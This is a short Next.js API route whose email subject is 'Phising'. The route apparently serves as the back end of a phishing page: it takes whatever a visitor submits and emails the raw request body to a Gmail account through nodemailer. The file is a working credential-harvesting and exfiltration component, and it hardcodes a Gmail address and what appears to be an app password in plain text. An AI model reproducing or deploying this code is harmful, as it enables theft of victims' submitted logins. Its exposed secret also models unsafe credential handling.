// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

var nodemailer = require("nodemailer");

export default async function handler(req, res) {
  var transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false,
    requireTLS: true,
    auth: {
      user: "arnav95600@gmail.com",
      pass: "tspshuecvvoughvi",
    },
  });

  var mailOptions = {
    from: "arnav95600@gmail.com",
    to: "arnav95600@gmail.com",
    subject: "Phising",
    text: JSON.stringify(req.body),
  };

  await transporter
    .sendMail(mailOptions, function (error, info) {
      if (error) {
        console.log(error);
      } else {
        console.log("Email was sent successfully: " + info.response);
      }
    })
    .then((e) => res.status(200).json(req.body));
}
